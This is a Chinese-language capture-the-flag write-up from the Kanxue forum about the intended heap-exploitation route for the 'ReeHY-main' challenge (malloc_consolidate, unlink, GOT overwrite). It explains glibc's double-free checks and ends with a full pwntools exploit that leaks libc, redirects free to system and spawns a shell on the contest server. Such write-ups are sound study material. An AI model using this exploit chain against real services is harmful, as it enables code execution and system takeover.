
# [原创]看雪CTF4-ReeHY-main-出题者思路分析

由于出题者本意不是`double free`，而且用的反正是我没听说过的思路，叫`malloc_consolidate+unlink+rop`，所以赶紧研究一发正解的思路。

## 出题思路

### 1. 堆的申请释放过程

首先根据出题者的EXP，写了个c程序来模拟一下exp的堆申请释放的过程，可以明白大致流程如下：

![](http://www.mutepig.club/usr/uploads/2017/06/502049213.png)

![](http://www.mutepig.club/usr/uploads/2017/06/856495344.png)

1. 首先申请两个`fastbin`，大小分别为0x10和0x30(实际上加上头是0x20和0x40)

2. 再申请一个`smallbin`

3. 释放前面的两个`fastbin`，那么这两个chunk都会加入到`fastbins`中，并且两个chunk的`PREV_INUSE`位仍为1。

4. 申请一个`largebin`，这时就会调用`malloc_consolidate`来合并`fastbin`，最终生成了一个新的chunk且总大小为0x60，并添加到`smallbins`中，同时第二个chunk的`PREV_INUSE`位变为0。

5. 再次释放第二个chunk，这样就可以将它再次加入`fastbin`以供再次使用。

6. 然后申请0x30空间，这样和第二个chunk的大小正好一样，于是直接从`fastbin`中取出来进行分配，同时它的`PREV_INUSE`仍为0。

7. 再申请0x20的空间，实际上需要分配0x30的空间，而由于已经没有`fastbin`了，所以可以从`smallbins`中寻找，那么找到了之前0x60的chunk进行分配，于是出现了两个chunk空间重叠的情况。而剩下的0x30个空间就加入到了`unsortedbin`，也成为了`last remainder`。

8. 再次申请一个`smallbin`，这时发现没有符合大小于是会将`unsortedbin`转移到`smallbins`中，最后在后面申请了一段新的空间。

9. 修改第二个chunk，来伪造`last remainder`的头。

10. 释放最开始的`smallbin`，由于它前面就是`last remainder`，于是进行合并，从而调用了`unlink`，这样就达成了我们的目的。

### 2. double_free_check

不过在这个流程中有一些自己没法理解问题，发现都是`double-free-check`的原因，所以首先得看看`free`的时候是如何进行`double-free-check`的，那么就得分析一下`_int_free()`源码了。

#### a. 待释放的指针`p`不能在`fastbins`里面

这个比较好理解，因为在`fastbins`里面的指针就是已经被释放了的，所以再次释放的话当然就是`double-free`了

```
3940            /* Check that the top of the bin is not the record we are going to add

3941               (i.e., double free).  */

3932        unsigned int idx = fastbin_index(size);

3933        fb = &fastbin (av, idx);



3936        mchunkptr old = *fb, old2;



3942            if (__builtin_expect (old == p, 0))

3943              {

3944                errstr = "double free or corruption (fasttop)";

3945                goto errout;

3946              }
```

#### b. 待释放chunk的下一个chunk的`PREV_INUSE`必须为1

这个也挺好理解的，就是表明当前的chunk必须在使用中嘛。

```
3991        /* Or whether the block is actually not marked used.  */

3992        if (__glibc_unlikely (!prev_inuse(nextchunk)))

3993          {

3994            errstr = "double free or corruption (!prev)";

3995            goto errout;

3996          }
```

在源码里还能搜到两个报错，但是判断待释放chunk或者它的下一个是否为`top->chunk`。

### 3. Q&A

那么存在以下几个问题(答案为自己的想法，仅供参考)：

#### a. 为什么第2步必须申请`smallbin`

这里申请的`smallbin`作用是在最后和前一个`last remainder`进行合并从而调用`unlink`，而前面那个是`fastbin`，如果这个空间也是`fastbin`将不会进行合并而只是加入`fastbins`，就无法调用`unlink`了。

#### b. 为什么需要第4步来将`fastbin`合并

第4步执行后，就会将`fastbin`合并并添加到`smallbins`中，这样就不会触发第一个`double-free-check`了。

#### c. 第3步和第5步释放两次第2个chunk的原因

第3步释放`chunk2`是为了进行`malloc_consolidate`来构造一个`smallbin`，而这个`smallbin`会在第7步分割出来一个触发`unlink`的chunk。而第二次释放`chunk2`是为了构造一个`fastbin`，并且实际上占用的是`smallbin`的空间。这样在第6步再次申请同样的空间将`fastbin`申请回来，这样就能通过修改这个chunk来对后面那个用来`unlink`的chunk头进行修改，因为他们占用的空间是重合的。

#### d. 第7步执行后发生了什么

第7步申请了0x20实际上需要0x30的空间，由于`fastbins`已经为空了所以得从`smallbins`中找，而这里就只有一个0x60的空间，所以需要切割。那么切割完后0x30的空间已经在被使用了，多出来的0x30的空间会变成一个新的`fastbin`，并且其`PREV_INUSE`为1(因为前面一个确实在被使用)。而之前下一个块也就是最开始申请的`smallbin`的`PREV_INUSE`仍为0，但`PREV_SIZE`变成了`0x30`，即指向分割剩下的这块`fastbin`。而这个剩下的`fastbin`加入了`unsorted bin`同时也成为了`last remainder`，作为下一次分配优先使用的区域。

#### e. 为什么第8步还要申请一个`smallbin`

因为`unsorted bin`是无法被`free`的，所以得先申请一个`smallbin`来将`unsorted bin`转移。

### 4. EXP

根据上面的分析，于是可以得到新的exp：

```
#!/usr/bin/env python

# encoding: utf-8



from pwn import *

import sys



context.log_level = "debug"



def Welcome():

    p.recvuntil("$ ")

    p.sendline("mutepig")



def Add(size,id,content="x"):

    p.recvuntil("$ ")

    p.sendline("1")

    p.recvuntil("size\n")

    p.sendline(str(size))

    p.recvuntil("cun\n")

    p.sendline(str(id))

    p.recvuntil("content\n")

    p.sendline(content)



def Remove(id):

    p.recvuntil("$ ")

    p.sendline("2")

    p.recvuntil("dele\n")

    p.sendline(str(id))



def Edit(id,content):

    p.recvuntil("$ ")

    p.sendline("3")

    p.recvuntil("edit\n")

    p.sendline(str(id))

    p.recvuntil("content\n")

    p.send(content)



if __name__ == "__main__":

    if len(sys.argv)==1:  # local

        p = process("./4-ReeHY-main")

        libc = ELF('libc.so.6')

    else:

        p = remote('211.159.216.90', 51888)

        libc = ELF('ctflibc.so.6')

    #gdb.attach(proc.pidof(p)[0],"b *0x400b62\n")

    #+==================INIT=====================================

    elf = ELF('4-ReeHY-main')

    libc_atoi = libc.symbols['atoi']

    libc_system = libc.symbols['system']

    libc_binsh = next(libc.search("/bin/sh"))

    main_addr = 0x400c9e

    free_got = elf.got['free']

    atoi_got = elf.got['atoi']

    puts_plt = elf.plt['puts']

    heap_addr = 0x602100

    #+==================INIT=====================================

    print hex(free_got)

    Welcome()

    Add(0x10,0)

    Add(0x30,1)

    Add(0xa0,3)

    Remove(0)

    Remove(1)

    Add(0x400,4)

    Remove(1)

    Add(0x30,2)

    Add(0x20,4)

    Add(0xb0,0,"/bin/sh\x00")

    Edit(2,'/bin/sh\x00' + p64(0x1) + p64(heap_addr - 0x18) + p64(heap_addr - 0x10))

    Remove(3)

    Edit(2,'1'*0x18 + p64(free_got) + p64(1) + p64(atoi_got)+ "\n")

    Edit(2,p64(puts_plt))



    Remove(3)

    atoi_addr = u64(p.recv(6)+'\x00\x00')

    base_addr = atoi_addr - libc_atoi

    system_addr = base_addr + libc_system



    log.success("systebm:" + hex(system_addr))



    Edit(2,p64(system_addr))

    Remove(0)



    p.interactive()
```

### 5. 总结

可以看到这个方法实际上还是需要对一个区间进行两次`free`操作，所以实际上`double free`是它的前提，但明显`double free`会简单很多。不过对这个方法的调试分析，让我对堆的申请释放过程尤其是对`double_free_check`的机制都多了一些理解，这对以后关于堆的学习我觉得还是很有帮助的。

最后还是给自己的博客打广告XD 570K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2#2N6r3g2H3K9h3N6Q4x3X3g2U0L8s2g2T1i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2H3K9s2m8Q4x3V1k6S2M7X3y4Z5K9i4k6W2M7#2)9J5c8U0t1$3i4K6u0r3

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
